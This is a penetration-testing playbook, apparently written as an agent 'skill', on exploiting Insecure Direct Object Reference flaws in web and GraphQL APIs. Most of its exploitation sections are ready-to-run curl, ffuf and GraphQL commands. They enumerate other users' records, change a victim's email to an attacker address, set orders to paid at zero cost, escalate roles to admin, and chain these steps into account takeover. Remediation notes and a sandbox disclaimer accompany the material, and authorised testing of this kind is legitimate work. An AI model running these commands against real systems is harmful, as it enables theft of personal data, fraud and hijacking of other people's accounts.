# Insecure Direct Object References (IDOR) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: idor-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A01:2021-BrokenAccessControl
tags:
  - idor
  - broken-access-control
  - bfdla
  - web-application
  - T1190
  - account-takeover
environments:
  - web
  - api
  - rest
  - graphql
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identifying Object References

Object references appear in:
- URL paths: `/api/users/1234`, `/invoice/2024-001`
- Query parameters: `?file_id=`, `?account=`, `?order=`
- POST/PUT/PATCH bodies: `{"id":1234}`
- Headers: `X-User-Id`, `Referer`
- GraphQL arguments: `query { user(id: 1234) { email } }`

### 1.2 Reference Types

| Type | Format | Guessability |
|---|---|---|
| Sequential integer | `/order/1001` | High |
| Sequential GUID fragments | `/doc/550e8400-e29b` | Medium |
| UUID v4 | `/user/f47ac10b-58cc` | Low (still testable) |
| Base64/encoded | `/u/MTAwMQ==` | Medium (decode first) |
| Hashed tokens | `/file/ab12cd...` | Low |

### 1.3 Detecting IDOR Behavior

Create two accounts (userA, userB). Intercept each object fetch with userA's session, then swap the object identifier with userB's object and replay. A successful read/modify/delete of the object owned by another principal confirms IDOR.

---

## 2. Confirmation

### 2.1 Sequential ID Confirmation

```bash
# Authenticated as userA
curl -s -b "session=AAA" "https://target.com/api/orders/1001"
curl -s -b "session=AAA" "https://target.com/api/orders/1002"
curl -s -b "session=AAA" "https://target.com/api/orders/9999"
# Compare: if 1002/9999 return userB data with HTTP 200 -> IDOR confirmed
```

### 2.2 Horizontal vs Vertical IDOR

- **Horizontal:** access a peer's resource at the same privilege level (`userB` reading `userA` data)
- **Vertical:** escalate privileges by referencing admin-level objects (`GET /api/admin/users/1` as a normal user)

---

## 3. Exploitation

### 3.1 Guessing and Mass Enumeration

```bash
# ffuf over sequential range
ffuf -u "https://target.com/api/orders/FUZZ" \
  -w <(seq 1001 1100) -b "session=AAA" -mc 200 -fs 300

# ffuf over real wordlist
ffuf -u "https://target.com/api/invoices/FUZZ" \
  -w ids.txt -b "session=AAA" -mc 200
```

### 3.2 Object Modification (PUT/PATCH)

```bash
# Modify another user's profile
curl -s -X PATCH -b "session=AAA" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","phone":"555-0000"}' \
  "https://target.com/api/users/1234"

# Change order state / price
curl -s -X PUT -b "session=AAA" \
  -d '{"id":5678,"status":"paid","amount":0}' \
  "https://target.com/api/orders/5678"
```

### 3.3 UUID Enumeration

- Check if UUIDs are sequential or derived from a counter (decode/entropy analysis)
- Look for exposed UUIDs in lists, comments, or client-side JS bundles
- If UUID v1 (timestamp-based) is used, predict the timestamp component
- GraphQL often leaks object IDs via `__typename` + `id` queries

```bash
# Test predictable / exposed UUIDs
for u in <uuid-list>; do
  curl -s -b "session=AAA" "https://target.com/api/user/$u" | jq -r '.email'
done
```

### 3.4 API-Specific Testing

**REST:**
- Replace `/me` with `/users/<id>`; compare responses
- Mass-assignment via `PATCH` with extra fields (`role`, `admin`, `plan`)

**GraphQL:**
```graphql
query { user(id: 2) { id email role } }
query { users { id email } }   # unauthorised list
mutation { updateUser(id: 2, input: {email:"x@e.com"}) { id } }
```

**Bulk endpoints:** `/api/export?ids=1,2,3,4`, `/api/batch` often bypass single-object checks.

### 3.5 Chaining to Account Takeover

1. IDOR `PATCH /api/users/1234/email` -> change victim email
2. IDOR `POST /api/users/1234/reset-password` -> trigger reset
3. IDOR read of `token` field in password-reset object -> intercept reset link
4. Login as victim -> full account takeover (ATO)

---

## 4. Tool-Specific Guidance

### 4.1 Burp Suite (Autorize / AutoRepeater)

1. Capture a request as low-priv user
2. Install Autorize extension; configure low-priv session cookie
3. Replay all high-priv requests; any 200 indicates IDOR/privilege issue
4. AutoRepeater can rewrite IDs/roles automatically for batch testing

### 4.2 ffuf / gobuster

```bash
ffuf -u "https://target.com/api/FUZZ/users/1" -w wordlist.txt -b "session=AAA"
gobuster dir -u https://target.com/api -w endpoints.txt -b "session=AAA" -x json
```

### 4.3 Burp Intruder for sequential IDs

- Use "Numbers" payload type (1 to 10000, step 1)
- Grep for unique email/name markers per response to identify owner

---

## 5. PoC Generation

### PoC Template

```markdown
## IDOR — [FINDING_ID]

**URL:** https://target.com/api/users/{id}
**Method:** GET / PATCH
**Type:** Horizontal / Vertical
**ID Format:** Sequential integer / UUID

### Payload
```
GET /api/users/1234 (as attacker account, session=AAA)
```

### Evidence
```
HTTP/1.1 200 OK
{"id":1234,"email":"victim@example.com","phone":"+1-555-...","role":"user"}
```

### Impact
- Horizontal data leak: YES
- Object modification: YES/NO
- Account takeover chain: YES/NO

### Remediation
- Replace direct object references with session-derived identifiers
- Enforce ownership checks server-side on every object operation
- Use unguessable IDs (UUIDv4) only as defence-in-depth, not a fix

### Reproduction Steps
1. Login as userA, fetch `/api/users/1234`
2. Swap id to userB's id, replay
3. Observe victim data / modify victim record
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Test accounts (two distinct users) provisioned in sandbox
- [ ] Object owners verified before and after each request
- [ ] No writes to production objects (PATCH tested on disposable data only)
- [ ] Mass-enumeration rate limited to avoid availability impact
- [ ] ATO chain fully documented before execution

---

## 7. Cheat Sheet/Reference

| Check | Command / Payload |
|---|---|
| Sequential ID | `seq 1 10000 \| ffuf -w - -u "https://t/api/order/FUZZ"` |
| PATCH profile | `PATCH /api/users/{id} {"email":"x@e.com"}` |
| /me swap | `GET /api/users/{id}` vs `GET /api/me` |
| Bulk IDs | `GET /api/export?ids=1,2,3` |
| Header ID | `X-User-Id: 1234` |
| UUID list | scrape from JS/GraphQL `__typename` |
| Role escalate | `PATCH /api/users/{id} {"role":"admin"}` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1078 | Valid Accounts | Abuse of own valid session |
| T1530 | Data from Cloud Storage Object | Data exfiltration variant |
| T1552.001 | Unsecured Credentials | Credential leak via IDOR |
| T1136.001 | Create Account: Local Account | Account creation abuse |

---

## 9. References

- PayloadsAllTheThings Insecure Direct Object References: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
- HackTricks IDOR: https://book.hacktricks.xyz/pentesting-web/idor
- PortSwigger Access Control: https://portswigger.net/web-security/access-control
- OWASP A01:2021: https://owasp.org/Top10/A01_2021-Broken_Access_Control/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
